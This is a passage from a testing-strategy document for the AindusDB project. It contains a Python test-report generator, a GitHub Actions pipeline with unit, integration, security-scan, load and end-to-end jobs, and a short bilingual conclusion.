import subprocess
from datetime import datetime
from pathlib import Path

def generate_test_report():
    """Generate comprehensive test report."""
    
    # Run tests and collect results
    test_results = {
        "timestamp": datetime.utcnow().isoformat(),
        "unit_tests": run_unit_tests(),
        "integration_tests": run_integration_tests(),
        "e2e_tests": run_e2e_tests(),
        "security_tests": run_security_tests(),
        "performance_tests": run_performance_tests()
    }
    
    # Calculate metrics
    total_tests = sum(result["total"] for result in test_results.values())
    total_passed = sum(result["passed"] for result in test_results.values())
    total_failed = sum(result["failed"] for result in test_results.values())
    
    metrics = {
        "total_tests": total_tests,
        "passed": total_passed,
        "failed": total_failed,
        "pass_rate": (total_passed / total_tests) * 100 if total_tests > 0 else 0,
        "coverage": get_coverage_report(),
        "performance": get_performance_metrics()
    }
    
    # Generate HTML report
    html_report = generate_html_report(test_results, metrics)
    
    # Save report
    report_path = Path("reports/test_report.html")
    report_path.parent.mkdir(exist_ok=True)
    report_path.write_text(html_report)
    
    return report_path

def run_unit_tests():
    """Run unit tests and return results."""
    result = subprocess.run([
        "pytest", "tests/unit", 
        "--json-report", "--json-report-file=unit_results.json"
    ], capture_output=True, text=True)
    
    with open("unit_results.json") as f:
        data = json.load(f)
    
    return {
        "total": data["summary"]["total"],
        "passed": data["summary"]["passed"],
        "failed": data["summary"]["failed"],
        "duration": data["summary"]["duration"]
    }

def generate_html_report(test_results, metrics):
    """Generate HTML test report."""
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>AindusDB Test Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            .header {{ background: #f0f0f0; padding: 20px; border-radius: 5px; }}
            .metric {{ display: inline-block; margin: 10px; padding: 10px; background: #e0e0e0; border-radius: 5px; }}
            .pass {{ color: green; }}
            .fail {{ color: red; }}
            table {{ border-collapse: collapse; width: 100%; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            th {{ background-color: #f2f2f2; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>AindusDB Test Report</h1>
            <p>Generated: {test_results['timestamp']}</p>
        </div>
        
        <div class="metrics">
            <div class="metric">
                <h3>Total Tests</h3>
                <p>{metrics['total_tests']}</p>
            </div>
            <div class="metric">
                <h3>Pass Rate</h3>
                <p class="pass">{metrics['pass_rate']:.1f}%</p>
            </div>
            <div class="metric">
                <h3>Coverage</h3>
                <p>{metrics['coverage']['percent']}%</p>
            </div>
        </div>
        
        <h2>Test Results by Category</h2>
        <table>
            <tr>
                <th>Category</th>
                <th>Total</th>
                <th>Passed</th>
                <th>Failed</th>
                <th>Duration</th>
            </tr>
            {generate_test_rows(test_results)}
        </table>
        
        <h2>Performance Metrics</h2>
        <table>
            <tr>
                <th>Metric</th>
                <th>Value</th>
            </tr>
            {generate_performance_rows(metrics['performance'])}
        </table>
    </body>
    </html>
    """
```

---

## 🚀 **CI/CD INTEGRATION**

### **🔄 GitHub Actions Workflow**
```yaml
# .github/workflows/testing.yml
name: Testing Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.9, 3.10, 3.11]
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python ${{ matrix.python-version }}
      uses: actions/setup-python@v4
      with:
        python-version: ${{ matrix.python-version }}
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        pip install -r requirements-dev.txt
    
    - name: Run unit tests
      run: |
        pytest tests/unit \
          --cov=app \
          --cov-report=xml \
          --cov-report=html \
          --junitxml=unit-results.xml
    
    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml
        flags: unittests
        name: codecov-umbrella
    
    - name: Publish test results
      uses: dorny/test-reporter@v1
      if: success() || failure()
      with:
        name: Unit Tests (${{ matrix.python-version }})
        path: unit-results.xml
        reporter: java-junit

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    services:
      postgres:
        image: ankane/pgvector:latest
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: test
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      
      redis:
        image: redis:7-alpine
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: "3.11"
    
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install -r requirements-dev.txt
    
    - name: Run integration tests
      env:
        DATABASE_URL: postgresql://postgres:test@localhost:5432/test
        REDIS_URL: redis://localhost:6379/0
      run: |
        pytest tests/integration \
          --junitxml=integration-results.xml
    
    - name: Publish integration test results
      uses: dorny/test-reporter@v1
      if: success() || failure()
      with:
        name: Integration Tests
        path: integration-results.xml
        reporter: java-junit

  security-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: "3.11"
    
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install bandit safety
    
    - name: Run Bandit security scan
      run: |
        bandit -r app/ -f json -o bandit-report.json
    
    - name: Run Safety check
      run: |
        safety check --json --output safety-report.json
    
    - name: Run security tests
      run: |
        pytest tests/security \
          --junitxml=security-results.xml
    
    - name: Upload security reports
      uses: actions/upload-artifact@v3
      with:
        name: security-reports
        path: |
          bandit-report.json
          safety-report.json
          security-results.xml

  performance-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    if: github.ref == 'refs/heads/main'
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: "3.11"
    
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install -r requirements-dev.txt
        pip install locust
    
    - name: Run performance tests
      run: |
        pytest tests/performance \
          --benchmark-only \
          --benchmark-json=benchmark.json
    
    - name: Run load tests
      run: |
        locust -f tests/performance/locustfile.py \
          --headless \
          --users 10 \
          --spawn-rate 2 \
          --run-time 60s \
          --host http://localhost:8000 \
          --html load-test-report.html
    
    - name: Upload performance reports
      uses: actions/upload-artifact@v3
      with:
        name: performance-reports
        path: |
          benchmark.json
          load-test-report.html

  e2e-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: "3.11"
    
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install -r requirements-dev.txt
        pip install playwright
    
    - name: Install Playwright browsers
      run: |
        playwright install
    
    - name: Start application
      run: |
        uvicorn app.main:app &
        sleep 10
    
    - name: Run E2E tests
      run: |
        pytest tests/e2e \
          --junitxml=e2e-results.xml
    
    - name: Upload E2E test results
      uses: dorny/test-reporter@v1
      if: success() || failure()
      with:
        name: E2E Tests
        path: e2e-results.xml
        reporter: java-junit
```

---

## 🎯 **CONCLUSION**

### **✅ Testing Strategy Benefits**
- **Quality Assurance** : 80%+ coverage garanti
- **Early Detection** : Bugs identifiés en développement
- **Regression Prevention** : Tests automatisés continus
- **Security Validation** : Tests sécurité intégrés
- **Performance Monitoring** : Métriques performance continues

### **🚀 Continuous Improvement**
- **Test Coverage** : Cible 90%+ à terme
- **Test Automation** : 100% automatisé dans CI/CD
- **Performance Baselines** : Monitoring régression performance
- **Security Scanning** : Scans automatiques chaque PR
- **Quality Gates** : Critères qualité stricts

---

*Testing Strategy - 21 janvier 2026*  
*Enterprise-Grade Quality Assurance*
